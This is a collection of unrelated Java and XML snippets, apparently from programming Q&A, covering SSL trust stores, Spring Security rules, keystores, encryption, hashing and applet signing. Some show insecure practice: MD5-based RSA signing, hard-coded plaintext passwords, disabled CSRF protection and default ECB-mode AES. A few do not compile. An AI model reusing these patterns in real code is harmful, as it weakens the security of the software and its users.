        fileOut.close();
        System.out.println("decrypted file created");
    }
    }
---UNIQUEIDFORSNIP---|164132257|    public class MySSLSocketFactory extends SocketFactory {
        private static final AtomicReference<MySSLSocketFactory> defaultFactory = new AtomicReference<>();
        private SSLSocketFactory sf;
        
        public MySSLSocketFactory() {
            KeyStore keyStore = ... /* Get a keystore containing the self-signed certificate) */
            TrustManagerFactory tmf = TrustManagerFactory.getInstance();
            tmf.init(keyStore);
            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, tmf.getTrustManagers(), null);
            sf = ctx.getSocketFactory();
        }
        public static SocketFactory getDefault() {
            final MySSLSocketFactory value = defaultFactory.get();
            if (value == null) {
                defaultFactory.compareAndSet(null, new MySSLSocketFactory());
                return defaultFactory.get();
            }
            return value;
        }
        @Override
        public Socket createSocket(final String s, final int i) throws IOException {
            return sf.createSocket(s, i);
        }
        @Override
        public Socket createSocket(final String s, final int i, final InetAddress inetAddress, final int i1) throws IOException {
            return sf.createSocket(s, i, inetAddress, i1);
        }
        @Override
        public Socket createSocket(final InetAddress inetAddress, final int i) throws IOException {
            return sf.createSocket(inetAddress, i);
        }
        @Override
        public Socket createSocket(final InetAddress inetAddress, final int i, final InetAddress inetAddress1, final int i1) throws IOException {
            return sf.createSocket(inetAddress, i, inetAddress1, i1);
        }
    }
---UNIQUEIDFORSNIP---|164132259|    env.put("java.naming.ldap.factory.socket", "com.example.MySSLSocketFactory");
---UNIQUEIDFORSNIP---|164699864|    PBKDF_SecretKeyFactory kf = new PBKDF_SecretKeyFactory("HmacSHA512");
    KeySpec ks = new PBEKeySpec(password,salt,iterations,bitlen);
    byte key[] = kf.engineGenerateSecret(ks).getEncoded();
---UNIQUEIDFORSNIP---|164864815|    <security:http auto-config="true" use-expressions="true" ...>
       ...
      <security:intercept-url pattern="/forAll/**" access="permitAll" />
      <security:intercept-url pattern="/**" access="isAuthenticated()" />
    </security:http>
---UNIQUEIDFORSNIP---|164864817|    @Secured("ROLE_ADMIN")
    @RequestMapping(params = "onlyForAdmins")    
    public ModelAndView onlyForAdmins() {
        ....
    }
  
---UNIQUEIDFORSNIP---|164864819|     @PreAuthorize("isAuthenticated()")
     @RequestMapping(params = "onlyForAuthenticated")
     public ModelAndView onlyForAuthenticatedUsers() {
         ....
     }
  
  
---UNIQUEIDFORSNIP---|164864821|     SecurityContextHolder.getContext().getAuthentication() != null &&
     SecurityContextHolder.getContext().getAuthentication().isAuthenticated() &&
     //when Anonymous Authentication is enabled
     !(SecurityContextHolder.getContext().getAuthentication() 
              instanceof AnonymousAuthenticationToken) 
     
---UNIQUEIDFORSNIP---|164864823|    public class MyCustomWebSecurityExpressionRoot
             extends WebSecurityExpressionRoot {
         public MyCustomWebSecurityExpressionRoot(Authentication a,
                     FilterInvocation f) {
              super(a, f);
         }
         
         /** That method is the one that does the expression evaluation! */
         public boolean myCustomAuthenticatedExpression() {
            return super.request.getSession().getValue("myFlag") != null;
         }
    }
---UNIQUEIDFORSNIP---|164864825|     public class MyCustomWebSecurityExpressionHandler
                  extends DefaultWebSecurityExpressionHandler {
          @Override        
          public EvaluationContext createEvaluationContext(Authentication a,
                    FilterInvocation f) {
              StandardEvaluationContext ctx =
                       (StandardEvaluationContext) super.createEvaluationContext(a, f);
              
               WebSecurityExpressionRoot myRoot =
                        new MyCustomWebSecurityExpressionRoot(a, f);
              
               ctx.setRootObject(myRoot);
               return ctx;
          }
     }
---UNIQUEIDFORSNIP---|164864827|    <security:http use-expressions="true"
	 access-decision-manager-ref="httpAccessDecisionManager" ...>
          ...
        <security:intercept-url pattern="/restricted/**"
                  access="myCustomAuthenticatedExpression" />         
          ...
    </security:http>
    <bean id="httpAccessDecisionManager"
          class="org.springframework.security.access.vote.AffirmativeBased">
        <constructor-arg name="decisionVoters">
                <list>
                    <ref bean="webExpressionVoter" />
                </list>
        </constructor-arg>
    </bean>
    <bean id="webExpressionVoter"
          class="org.springframework.security.web.access.expression.WebExpressionVoter">
        <property name="expressionHandler"
                  ref="myCustomWebSecurityExpressionHandler" />
    </bean>
  
    <bean id="myCustomWebSecurityExpressionHandler"
        class="MyCustomWebSecurityExpressionHandler" />
     
---UNIQUEIDFORSNIP---|164864829|     public class MyCustomWebSecurityExpressionHandler
                  extends DefaultWebSecurityExpressionHandler {
          @Override        
          public SecurityExpressionOperations createSecurityExpressionRoot(
                    Authentication a,
                    FilterInvocation f) {
               WebSecurityExpressionRoot myRoot =
                        new MyCustomWebSecurityExpressionRoot(a, f);
              
               myRoot.setPermissionEvaluator(getPermissionEvaluator());
               myRoot.setTrustResolver(this.trustResolver);
               myRoot.setRoleHierarchy(getRoleHierarchy());
               return myRoot;
          }
     }
     
---UNIQUEIDFORSNIP---|164915800|    import java.security.Provider;
    import java.security.Provider.Service;
    import java.security.Security;
    import java.util.Set;
    public class MainActivity
    {
      public static void main(String[] args)
      {
        Provider [] providerList = Security.getProviders();
        for (Provider provider : providerList)
         {
           System.out.println("Name: "  + provider.getName());
           System.out.println("Information:\n" + provider.getInfo());
           Set<Service> serviceList = provider.getServices();
           for (Service service : serviceList)
            {
              System.out.println("Service Type: " + service.getType() + " Algorithm " + service.getAlgorithm());
            }
         }
      }
    }
---UNIQUEIDFORSNIP---|164989870|    @Override
    public String getNullableResult(ResultSet rs, int columnIndex)
    throws SQLException
    {
        return rs.getString(columnIndex);
    }
---UNIQUEIDFORSNIP---|164989873|    @Override
    public StringBuilder getNullableResult(ResultSet rs, int columnIndex)
    throws SQLException
    {
        final StringBuilder returnValue = new StringBuilder();
        final byte[] value = rs.getbytes(columnIndex);
        // add the bytes to the StringBuilder.
        return returnValue;
    }
---UNIQUEIDFORSNIP---|165366827|    int[] pixels = new int[bm.getWidth() * bm.getHeight()];
    bm.getPixels(pixels, 0, bm.getWidth(), 0, 0, bm.getWidth(), bm.getHeight()); 
    encryptIntArray(pixels);
    bm.setPixels(pixels, 0, bm.getWidth(), 0, 0, bm.getWidth(), bm.getHeight());
---UNIQUEIDFORSNIP---|165366829|    ByteBuffer bb = ByteBuffer.allocate(bm.getByteCount());
    bm.copyPixelsToBuffer(bb);
    byte[] b = bb.array();
    bm.copyPixelsFromBuffer(ByteBuffer.wrap(Security.encrypt(key,b)));
---UNIQUEIDFORSNIP---|165639065|    import java.security.SecureRandom;
        
    public class Main{
        public static void main(String[] args){
        
          SecureRandom seedMaker = new SecureRandom();  
          byte[] seed = seedMaker.generateSeed(20);
          SecureRandom r1 = new SecureRandom(seed);
          SecureRandom r2 = new SecureRandom(seed);
      
          byte[] b1 = new byte[4];
          byte[] b2 = new byte[4];
          for (int i=0;i<10;i++) {
            r1.nextBytes(b1);
            r2.nextBytes(b2);
        
            System.out.println(java.util.Arrays.toString(b1)+" == "+java.util.Arrays.toString(b2));
          }
        }
    }
---UNIQUEIDFORSNIP---|165654874|    // Load CAs from an InputStream
    // (could be from a resource or ByteArrayInputStream or ...)
    CertificateFactory cf = CertificateFactory.getInstance("X.509");
    // From https://www.washington.edu/itconnect/security/ca/load-der.crt
    InputStream caInput = new BufferedInputStream(new FileInputStream("load-der.crt"));
    Certificate ca;
    try {
        ca = cf.generateCertificate(caInput);
        System.out.println("ca=" + ((X509Certificate) ca).getSubjectDN());
    } finally {
        caInput.close();
    }
    
    // Create a KeyStore containing our trusted CAs
    String keyStoreType = KeyStore.getDefaultType();
    KeyStore keyStore = KeyStore.getInstance(keyStoreType);
    keyStore.load(null, null);
    keyStore.setCertificateEntry("ca", ca);
    
    // Create a TrustManager that trusts the CAs in our KeyStore
    String tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();
    TrustManagerFactory tmf = TrustManagerFactory.getInstance(tmfAlgorithm);
    tmf.init(keyStore);
    
    // Create an SSLContext that uses our TrustManager
    SSLContext context = SSLContext.getInstance("TLS");
    context.init(null, tmf.getTrustManagers(), null);
    // Tell the okhttp to use a SocketFactory from our SSLContext
    OkHttpClient okHttpClient client = new OkHttpClient.Builder().sslSocketFactory(context.getSocketFactory()).build();
---UNIQUEIDFORSNIP---|165654877|    InputStream caInput = new BufferedInputStream(context
                    .getResources().openRawResource(R.raw.certfilename));
---UNIQUEIDFORSNIP---|165654880|    openssl s_client -connect {server-address}:{port} -showcerts
---UNIQUEIDFORSNIP---|165800174|    KeyStore ks = KeyStore.getInstance("pkcs12");
    ks.load(new FileInputStream(file), password.toCharArray());
    Enumeration<String> enumeration = ks.aliases();
    while (enumeration.hasMoreElements()) {
      String alias = enumeration.nextElement();
      Certificate certificate = ks.getCertificate(alias);
      RSAPublicKey pub = (RSAPublicKey) certificate.getPublicKey();
      System.out.println(pub.getModulus().toString(16));
      System.out.println(pub.getPublicExponent().toString(16));
    }
---UNIQUEIDFORSNIP---|166400528|    // spacing modified for readability
    var $strongName = '02F159CD1F48EEB372B36E0BA704A0BE';
    function __gwtStartLoadingFragment(frag) {
        return $moduleBase + 'deferredjs/'  + $strongName + '/' + frag + '.cache.js';
    }
---UNIQUEIDFORSNIP---|166400530|    public String getAlgorithmCode(String name) {
        // locate the code. store it in a file, database, cache it in memory, etc.
        // ...
        return javascriptSourceCode;
    }
---UNIQUEIDFORSNIP---|166404615|    Refused to apply style because its MIME type ('text/html') is not a supported stylesheet MIME type
---UNIQUEIDFORSNIP---|166404619|    @RequestMapping("/login")
---UNIQUEIDFORSNIP---|166404623|    @RequestMapping
---UNIQUEIDFORSNIP---|166503162|    PrivateKeyInfo pkInfo = PrivateKeyInfo.getInstance(pkPair.getPrivateKey().getEncodedKey());
    ASN1Encodable privateKeyPKCS1ASN1Encodable = pkInfo.parsePrivateKey();
    ASN1Primitive privateKeyPKCS1ASN1 = privateKeyPKCS1ASN1Encodable.toASN1Primitive();
    byte[] privateKeyPKCS1 = privateKeyPKCS1ASN1.getEncoded();
---UNIQUEIDFORSNIP---|166560242|    Java SE 6 Update 45[76] 	2013-04-16 	42 security fixes;[77] other changes;[76] final public update[78]
---UNIQUEIDFORSNIP---|166603109|    int generateHashCode(int a,int b) {
        // Start with a non-zero constant. Prime is preferred
        int result = 17;
        // For each field multiply the previous result by a prime and add
        result = 31 * result + a;         
        result = 31 * result + b;         
        return result;
    }
---UNIQUEIDFORSNIP---|166620745|<b<i>>Hello World!</b</i>>
---UNIQUEIDFORSNIP---|166816690|    GET /index.html HTTP/1.1
---UNIQUEIDFORSNIP---|166894359|    ProcessBuilder pb = new ProcessBuilder("/bin/mount", "-o", "loop", /*...*/);
    pb.redirectErrorStream(true); // equivalent of 2>&1
    Process p = pb.start();
---UNIQUEIDFORSNIP---|166937669|    @Stateless
    @WebService(name = "MyAppServices")
    @RolesAllowed({"user"})
    public class ItemEJB {
        ...
    }
---UNIQUEIDFORSNIP---|166937674|    <sun-ejb-jar>
	<security-role-mapping>
                <!-- as defined in @RolesAllowed -->
		<role-name>user</role-name>
                <!-- glassfish group created in file realm -->
		<group-name>user</group-name>
	</security-role-mapping>
	<enterprise-beans>
		<ejb>
			<ejb-name>ItemEJB</ejb-name>
			<webservice-endpoint>
				<!-- equivalent to name attribute of @WebService -->
				<port-component-name>MyAppServices</port-component-name>
				<login-config>
					<auth-method>BASIC</auth-method>
					<realm>file</realm>
				</login-config>
			</webservice-endpoint>
		</ejb>
	</enterprise-beans>
---UNIQUEIDFORSNIP---|166981302|    messageInfo.getMap().put("javax.servlet.http.registerSession", TRUE.toString());
---UNIQUEIDFORSNIP---|166981311|    HttpServletRequest request = (HttpServletRequest) messageInfo.getRequestMessage();
    Principal userPrincipal = request.getUserPrincipal();
         
    if (userPrincipal != null) {   
        handler.handle(new Callback[] { 
            new CallerPrincipalCallback(clientSubject, userPrincipal) }
        );
                 
        return SUCCESS;   
    }
---UNIQUEIDFORSNIP---|167077635|    Environment env = new Environment();
    env.setInitialContextFactory(Environment.DEFAULT_INITIAL_CONTEXT_FACTORY);
    //	env.setSecurityPrincipal("user");
    //	env.setSecurityCredentials("pass");
    env.setProviderUrl("t3s://localhost:7002");
    
    InputStream key = new PEMInputStream(new FileInputStream(CERT_KEYFILE));
    InputStream cert = new PEMInputStream(new FileInputStream(CERT_CERTFILE));
    env.setSSLClientCertificate(new InputStream[] {key, cert});
    env.setSSLClientKeyPassword(CERT_KEYPASSWORD);
---UNIQUEIDFORSNIP---|167086189|    git clone git://android.git.kernel.org/platform/dalvik.git
---UNIQUEIDFORSNIP---|167091255|	@Inject
	StudentBeanLocal studentBeanLocal;
---UNIQUEIDFORSNIP---|167301718|    public byte[] Sign(byte[] aMessage) {
    
    		try {
    			// get an instance of a cipher with RSA with ENCRYPT_MODE
    			// Init the signature with the private key
    			// Compute signature
    			Cipher cipher = Cipher.getInstance("RSA");
    			cipher.init(Cipher.ENCRYPT_MODE, thePrivateKey);
    
    			// get an instance of the java.security.MessageDigest with MD5
    			// process the digest
    			MessageDigest md5_digest = MessageDigest.getInstance("MD5");
    			byte[] digest = md5_digest.digest(aMessage);
    
    			// return the encrypted digest
    			byte[] cipherText = cipher.doFinal(digest);
    
    			return cipherText;
    
    		} catch (Exception e) {
    			System.out.println("Signature error");
    			e.printStackTrace();
    			return null;
    		}
    
    	}
---UNIQUEIDFORSNIP---|167315845|    <dependency>
        <groupId>com.h2database</groupId>
        <artifactId>h2</artifactId>
        <version>1.4.192</version>
        <scope>runtime</scope>
    </dependency>
---UNIQUEIDFORSNIP---|167320735|    public static byte[] getPublicKey(){ 
        try
        {                
            RSAPublicKey key = (RSAPublicKey)keystore.getCertificate("alias").getPublicKey();    
            return key.getModulus().toByteArray();
            
        }catch(Exception e){
        }
        return null;
    }
---UNIQUEIDFORSNIP---|167350053|      In ldif file:
        dc: xxxx
        objectClass: yyyyy
        userCertificate;binary:< file:///path/to/certificate.der
  
---UNIQUEIDFORSNIP---|167350059|     java.security.cert.X509Certificate 
---UNIQUEIDFORSNIP---|167358550|    @EnableWebSecurity
    public class MultiHttpSecurityConfig {
    	@Autowired
    	public void configureGlobal(AuthenticationManagerBuilder auth) { 1
    		auth
    			.inMemoryAuthentication()
    				.withUser("user").password("password").roles("USER").and()
    				.withUser("admin").password("password").roles("USER", "ADMIN");
    	}
    
    	@Configuration
    	@Order(1)                                                        2
    	public static class ApiWebSecurityConfigurationAdapter extends WebSecurityConfigurerAdapter {
    		protected void configure(HttpSecurity http) throws Exception {
    			http
    				.antMatcher("/api/**")                               3
    				.authorizeRequests()
    					.anyRequest().hasRole("ADMIN")
    					.and()
    				.httpBasic();
    		}
    	}
    
    	@Configuration                                                   4
    	public static class FormLoginWebSecurityConfigurerAdapter extends WebSecurityConfigurerAdapter {
    
    		@Override
    		protected void configure(HttpSecurity http) throws Exception {
    			http
    				.authorizeRequests()
    					.anyRequest().authenticated()
    					.and()
    				.formLogin();
    		}
    	}
    }
---UNIQUEIDFORSNIP---|167360265|    <user-service>  
      <user name="Sriram" password="12345" authorities="ROLE_USER" />  
      <user name="Vignesh" password="12345" authorities="ROLE_ADMIN" />
      <user name="Yogesh" password="12345" authorities="PARTNER_CUSTOMER" />
     </user-service>
---UNIQUEIDFORSNIP---|167360269|    <http auto-config="true">  
      <access-denied-handler error-page="/403page" />  
      <intercept-url pattern="/user**" access="ROLE_USER" />  
      <intercept-url pattern="/admin**" access="ROLE_ADMIN" />  
      <form-login login-page='/login' username-parameter="username"  
       password-parameter="password" default-target-url="/user"  
       authentication-failure-url="/login?authfailed" />  
      <logout logout-success-url="/login?logout" />  
     </http>
---UNIQUEIDFORSNIP---|167370428|    InputStream textReader = new ByteArrayInputStream ( myByteArray);
    SAXParserFactory parserFactory = SAXParserFactory.newInstance();
    try {
	        XMLReader reader = parserFactory.newSAXParser().getXMLReader();
	        reader.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
	        InputSource inputSource = new InputSource( textReader );
	        reader.parse(inputSource);
    }
---UNIQUEIDFORSNIP---|167422916|    decryptedOut = new String(cipher.doFinal(data));
---UNIQUEIDFORSNIP---|167422920|    decryptedOut = new String(cipher.doFinal(encryptedOut));
---UNIQUEIDFORSNIP---|167422923|    decryptedOut = new String(cipher.doFinal(encryptedOut),"UTF-8");
---UNIQUEIDFORSNIP---|167422926|    this.data = dataIn.getBytes("UTF-8");
---UNIQUEIDFORSNIP---|167451432|    BigInteger bi = new BigInteger("76292708057987193002565060032465481997");
    System.out.println(bi.toString(16));
---UNIQUEIDFORSNIP---|167451436|    396570ebd89f28204ec2a06b9848310d
---UNIQUEIDFORSNIP---|167481071|    <p>name <c:out value='${param.name}'/> </p>
---UNIQUEIDFORSNIP---|167903150|    public class TokenHelper {
	private static Logger logger = LoggerFactory.getLogger(TokenHelper.class);
	private static final int HTTP_TIMEOUT_MILISEC = 100000;
	private static String lineSeparator = System.getProperty("line.separator");
	@Value("#{'${hostname}'}")
	private String hostName;
	@Value("#{'${port}'}")
	private int port;
	@Value("#{'${contextpath}'}")
	private String contextPath;
	@Value("#{'${isbasicauthentication}'}")
	private boolean isBasicAuthentication;
	@Value("#{'${username}'}")
	private String basicAuthenticationUserName;
	@Value("#{'${userpassword}'}")
	private String basicAuthenticationPassword;
	public Map<String, String> getLtpaToken() throws Exception {	
		Cookie[] cookies = null;
		Protocol protocol = null;
		Map<String, String> cookiesMap = new HashMap<String, String>();
		GetMethod method = new GetMethod();
		HttpClient client = new HttpClient();
		method.getParams().setSoTimeout(HTTP_TIMEOUT_MILISEC);
		protocol = new Protocol("http", new DefaultProtocolSocketFactory(), getPort());
		
		if (isBasicAuthentication) {
			client.getParams().setAuthenticationPreemptive(true);
			Credentials defaultcreds = new UsernamePasswordCredentials(getBasicAuthenticationUserName(), getBasicAuthenticationPassword());
			client.getState().setCredentials(new AuthScope(getHostName(), getPort(), AuthScope.ANY_REALM), defaultcreds);
		}
		// Execute request
		try {
			client.getHostConfiguration().setHost(getHostName(), getPort(), protocol);
			method = new GetMethod(getContextPath());
			method.setFollowRedirects(true);
			
			logger.info(methodName, "URL to get:" + getContextPath());
			// Execute the GET method			
			int statusCode = client.executeMethod(method);
			if (statusCode != -1) {
				cookies = client.getState().getCookies();
				StringBuffer sb = new StringBuffer();
				for (int j = 0; j < cookies.length; j++) {
					cookiesMap.put(cookies[j].getName(), cookies[j].getValue());
					sb.append("CookieName=" + cookies[j].getName() + lineSeparator);
					sb.append("Value=" + cookies[j].getValue() + lineSeparator);
					sb.append("Domain=" + cookies[j].getDomain() + lineSeparator);
				}
				sb.append("Status Text>>>" + HttpStatus.getStatusText(statusCode));
				logger.debug("Cookies are: {}" + sb.toString());
		
				method.releaseConnection();
				
			}
		} catch (Exception e) {
			logger.error("Error while getting LTPA token using HttpBasicAuthentication for URL {}" +e);
			throw new RuntimeException("Error while getting LTPA token using HttpBasicAuthentication for URL:" + contextPath, e);
		} finally {
			// Release current connection to the connection pool once you
			// are done
			method.releaseConnection();
		}
		return cookiesMap;
	}
---UNIQUEIDFORSNIP---|167941639|    import java.io.*;
    import java.security.*;
    import java.security.cert.Certificate;
    
    public class KeyPrinter {
    
        /**
         * to be invoked with these parameters:
         * 
         * [0]:  keystore-password
         * [1]:  filename
         * [2]:  alias
         * [3]:  entry-Password (if necessary)
         */
        public static void main(String[] params)
            throws IOException, GeneralSecurityException
        {
            char[] storePass = params[0].toCharArray();
            String fileName = params[1];
            String alias = params[2];
            KeyStore.ProtectionParameter entryPass;
            if(params.length > 3) {
	        entryPass=new KeyStore.PasswordProtection(params[3].toCharArray());
            } else {
                entryPass = null;
            }
               
            KeyStore store = KeyStore.getInstance("JKS");
            InputStream input = new FileInputStream(fileName);
            store.load(input, storePass);
            
            KeyStore.Entry entry = store.getEntry(alias, entryPass);
            System.out.println(entry);
    
        }
    }
---UNIQUEIDFORSNIP---|168037486|    <a href="@{Secure.logout2(request.url)}">logout</a>
---UNIQUEIDFORSNIP---|168037488|    public static void logout2(String returnUrl) throws Throwable {
    	flash.put("returnUrl", returnUrl == null ? "/" : returnUrl);
    	logout();
    }
---UNIQUEIDFORSNIP---|168037490|    public static void logout() throws Throwable {
    	session.clear();
    	response.removeCookie("rememberme");
    	Security.invoke("onDisconnected");
    	flash.success(Messages.get("secure.logout", "You have been successfully logged out"));
    
    	String returnUrl = flash.get("returnUrl");
    	redirect(returnUrl == null ? "/" : returnUrl);
    }
---UNIQUEIDFORSNIP---|168213756|    @Configuration
    @EnableWebSecurity
    public class SecurityConfig extends WebSecurityConfigurerAdapter {
        private static final Logger logger = LoggerFactory.getLogger(SecurityConfig.class);
        private AuthenticationProvider authenticationProvider;
        @Value("${user.name}") 
        private String userName;
        @Value("${user.password}") 
        private String userHashedPassword; // hashed password
        @Override
        protected void configure(HttpSecurity http) throws Exception {
        http.csrf().disable().authorizeRequests().anyRequest().authenticated().and().httpBasic()
                .and().sessionManagement().and().authenticationProvider(authenticationProvider)
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        }
        @Override
	    public void configure(AuthenticationManagerBuilder auth) throws Exception
	    {
		    auth
               .inMemoryAuthentication()
               .passwordEncoder(passwordEncoder())
               .withUser(userName)
               .password(userHashedPassword);
	    }
        @Bean
        public PasswordEncoder passwordEncoder() {
            return new BCryptPasswordEncoder();
        }
    }
---UNIQUEIDFORSNIP---|168256894|    gen.addSignerInfoGenerator(
                new JcaSignerInfoGeneratorBuilder(
                     new JcaDigestCalculatorProviderBuilder().setProvider("BC").build())
                     .build(sha1Signer, certificate));
    // use this to add the certificates to your signature
    gen.addCertificates(certs);
    signedData = gen.generate(cmsBytes, true);
---UNIQUEIDFORSNIP---|168390291|    <%@ taglib uri="http://java.sun.com/jsp/jstl/functions" prefix="fn" %>
    ${fn:escapeXml(someValue)}
---UNIQUEIDFORSNIP---|168390296|    String text = request.getParameter("text");
    String safe = Jsoup.clean(text, Whitelist.basic());
    // Persist 'safe' in DB instead.
---UNIQUEIDFORSNIP---|168635463|    public class MyApplet extends JApplet {
        private IHelper pHelper = null;
        private MyReturnedInfo pInfo = null;
        public void init() {
            pHelper = (IHelper)Native.loadLibrary("Helper", IHelper.class);
            if (pHelper != null) {
                pInfo = pHelper.GetInfo();
            }
        }
        public String GetInfoString() {
            if (pInfo != null) {
                // need to call toString to convert from native wide char to something JavaScript will be able to interpret
                return pInfo.MyInfoString.toString(); 
            }
            return null;
        }
    }
---UNIQUEIDFORSNIP---|168635465|    <script type="text/javascript" src="https://www.java.com/js/deployJava.js"></script>
    <script type="text/javascript">
        var attributes = {
            id: "myApplet",
            name: "myApplet",
            code: "MyApplet.class",
            mayscript: "true",
            scriptable: "true",
            archive: "/path(s)/to/jar(s)",
            width: 0,
            height: 0
       };
        var params = {
            "AppletReady": "appletInitialized",
        };
        // For convenience, it's easier to deploy the applet using deployJava,
        // so it writes the applet HTML tag for us after checking if Java is installed.
        // We have included it above.
        deployJava.runApplet(attributes, params, "1.8.0");
        function appletInitialized(myString, someOtherArgument) {
            // do something with your parameters
            // NOTE: do NOT call alert() from this function! 
            // Because it will most likely cause your browser to freeze, 
            // I've found that's also one of the things Java doesn't like.
        };
    </script>
---UNIQUEIDFORSNIP---|168635467|    public class MyApplet extends JApplet {
        private IHelper pHelper = null;
        private MyReturnedInfo pInfo = null;
        public void init() {
            // Read the AppletReady parameter as passed from JavaScript
            String paramKey = "AppletReady";
		    String jsLoadedCallback = this.getParameter(paramKey);
            // Load the library and get the information
            pHelper = (IHelper)Native.loadLibrary("Helper", IHelper.class);
            if (pHelper != null) {
                pInfo = pHelper.GetInfo();
                if (pInfo != null && jsLoadedCallback != null) {
                    // Get the window which contains "this" applet
					JSObject jsObject = JSObject.getWindow(this);
                    // Call the provided JavaScript function.
                    // You can use as many parameters as you need.
					jsObject.call(jsLoadedCallback, new Object[] {
							pInfo.MyInfoString.toString(),
                            pInfo.SomeOtherStringMaybe.toString()
                    });
                }
            }
        }
    }
---UNIQUEIDFORSNIP---|168739796|    cd /
    keytool -genkey -dname "cn=CN, ou=OU, o=O, l=L, st=ST, c=C" -alias mykey -keypass mypass -keystore mystore -validity 3650 -storepass mypass
    jarsigner -keystore c:\mystore -storepass mypass C:\path\to\applet.jar mykey
---UNIQUEIDFORSNIP---|169166103|    public class ExampleFactoryBean implements FactoryBean<TrustManagerFactory> {
    
        private Resource keystore;
        private String password;
    
        @Override
        public TrustManagerFactory getObject() throws Exception {
                KeyStore truststore = KeyStore.getInstance("JKS");
                truststore.load(keystore.getInputStream(), password.toCharArray());
                TrustManagerFactory tmf = TrustManagerFactory.getInstance("SunX509");
                tmf.init(truststore);
                return tmf;
        }
    
        @Override
        public Class<?> getObjectType() {
            return TrustManagerFactory.class;
        }
    
        @Override
        public boolean isSingleton() {
            return true;
        }
    
        public void setKeystore(Resource keystore) {
            this.keystore = keystore;
        }
    
        public void setPassword(String password) {
            this.password = password;
        }
    }
---UNIQUEIDFORSNIP---|169166105|    <https:connector name="myHttpsConnector">
        <spring:property name="trustManagerFactory">
            <spring:bean class="com.mycompany.ssl.ExampleFactoryBean">
                <spring:property name="keystore" value="classpath:mykeystore.keystore" />
                <spring:property name="password" value="mypassword" />
            </spring:bean>
        </spring:property>
    </https:connector>
---UNIQUEIDFORSNIP---|169652540|        public static SignedRequestResponse parse_signed_request(String input, String secret, int max_age) {
            String[] split = input.split("[.]", 2);
            SignedRequestResponse response = new SignedRequestResponse();
            response.setStatus(Status.Failure);
    
            String encoded_sig = split[0];
            String encoded_envelope = split[1];
            JSONParser parser = new JSONParser();
            Map envelope;
            try {
                envelope = (Map) parser.parse(new String(base64_url_decode(encoded_envelope)));
            } catch (Exception ex) {
                response.addError("ParsingError");
                return response;
            }
    
            response.setEnvelope(envelope);
    
            String algorithm = (String) envelope.get("algorithm");
    
            if (!algorithm.equals("HMAC-SHA256")) {
                response.addError("UnsupportedAlgorithm");
                return response;    // instant fail
            }
    
            byte[] key = secret.getBytes();
            SecretKey hmacKey = new SecretKeySpec(key, "HMACSHA256");
            Mac mac = null;
            try {
                mac = Mac.getInstance("HMACSHA256");
                mac.init(hmacKey);
            } catch (Exception e) {
                response.addError("DecryptionError");
                return response; // instant fail
            }
    
            byte[] digest = mac.doFinal(encoded_envelope.getBytes());
            try {
    
                if (!Arrays.equals(base64_url_decode(encoded_sig), digest)) {
                    response.addError("InvalidSignature");
                    return response; // instant fail
                }
            } catch (Exception ex) {
                response.addError("InvalidSignature");
                return response; // instant fail
            }
    
            if (((Long) envelope.get("issued_at")) < System.currentTimeMillis() / 1000 - max_age) {
                response.addError("Expired");
                response.setStatus(Status.PartialSuccess);
                return response;    // partial fail
            }
    
            response.setStatus(Status.Success);
            return response;
        }
    }
---UNIQUEIDFORSNIP---|169859674|		<dependency>
				<groupId>org.springframework.security</groupId>
				<artifactId>spring-security-core</artifactId>
				<version>4.1.3.RELEASE</version>
			</dependency>
	<dependency>
		<groupId>org.springframework.security</groupId>
		<artifactId>spring-security-config</artifactId>
		<version>${spring.ver}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework.security</groupId>
		<artifactId>spring-security-web</artifactId>
		<version>4.1.3.RELEASE</version>
	</dependency>
---UNIQUEIDFORSNIP---|169898661|	<!-- Configure realm for system administration users -->
    <security:http pattern="/admin/**" create-session="stateless">
		<security:intercept-url pattern='/**' access='ROLE_ADMIN' requires-channel="https" />
		<security:http-basic/>	
	</security:http>
	<!-- Configure realm for standard users -->
	<security:http auto-config="true" access-denied-page="/error/noaccess" use-expressions="true" create-session="ifRequired">
		<security:form-login login-page="/login"
                ...
                ...
    </security:http>
---UNIQUEIDFORSNIP---|169904399|    1.keytool -genkey -keyalg rsa -alias m4key  //m4key unique key
    2.keytool -export -alias m4key -file bmcert.crt   //bmcert.crt certificate name
    3.jar tvf Jarname.jar verify jar
    4.jarsigner Jarname.jar m4key
    5.jarsigner -verify -verbose -certs JarnameJarname.jar
---UNIQUEIDFORSNIP---|170012867|    1) Allow you connect to queue manager
    2) Allow you put/get messages to queue(s)
---UNIQUEIDFORSNIP---|170012873|    Hashtable props = new Hashtable();
    props.put(CMQC.HOST_NAME_PROPERTY, "mymq.server.com"); 
    props.put(CMQC.PORT_PROPERTY, 1414);
    props.put(CMQC.CHANNEL_PROPERTY, "SYSTEM.DEF.SVRCONN");
    props.put(CMQC.USER_ID_PROPERTY, "myusername";)
    MQQueueManager qMgr = new MQQueueManager(qManager, props);
---UNIQUEIDFORSNIP---|170128808|    http
     .authorizeRequests()
     .antMatchers("/non-secure/**").permitAll()
     .antMatchers("/secure/**").hasAuthority("user")
     .and().requiresChannel().antMatchers("/non-secure/**").requiresInsecure()
     .and().requiresChannel().antMatchers("/secure/**").requiresSecure()
---UNIQUEIDFORSNIP---|170188674|    private static Cipher AESCipher = null;
	private static Cipher RSACipher = null;
	static {
		try {
			AESCipher = Cipher.getInstance("AES");
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			e.printStackTrace();
		}
	}
	static {
		try {
			RSACipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			e.printStackTrace();
		}
	}
---UNIQUEIDFORSNIP---|170228073|String base64encoded = Base64.getEncoder().encodeToString(getEncryptedPassword(p,s,i,l)));
---UNIQUEIDFORSNIP---|170228075|String hexEncoded = Hex.encodeHexString(getEncryptedPassword(p,s,i,l)));
---UNIQUEIDFORSNIP---|170576359|    <subsystem xmlns="urn:jboss:domain:infinispan:1.4">
        <cache-container name="security" default-cache="auth-cache">
            <local-cache name="auth-cache" batching="true">
                <expiration lifespan="*INSERT_CACHE_TIMEOUT_IN_MILLIS"/>
            </local-cache>
        </cache-container>
    ...
    <security-domain name="myJaasDomain" cache-type="infinispan">
---UNIQUEIDFORSNIP---|170632793|    <?xml version="1.0"?>
